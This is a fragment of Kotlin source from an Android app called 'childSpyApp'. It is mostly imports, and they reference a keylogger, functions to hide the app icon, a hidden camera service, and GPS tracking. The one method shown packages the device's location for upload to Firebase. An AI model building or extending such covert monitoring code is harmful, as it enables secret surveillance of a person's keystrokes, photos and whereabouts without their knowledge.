package sammy.mutahi.gicheru.childSpyApp.services.accessibilityData
...
import sammy.mutahi.gicheru.childSpyApp.data.model.Photo
...
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.getRandomNumeric
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.hideApp
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.showApp
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_CAPTURE_PHOTO
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_GPS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_PERMISSION
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_SERVICE_DATA
...
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.KEY_LOGGER
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.KEY_TEXT
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.LOCATION
...
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.CameraCallbacks
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.CameraConfig
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.HiddenCameraService
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.config.CameraFacing
import sammy.mutahi.gicheru.childSpyApp.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = sammy.mutahi.gicheru.childSpyApp.data.model.Location(location.latitude, location.longitude, address, getDateTime())
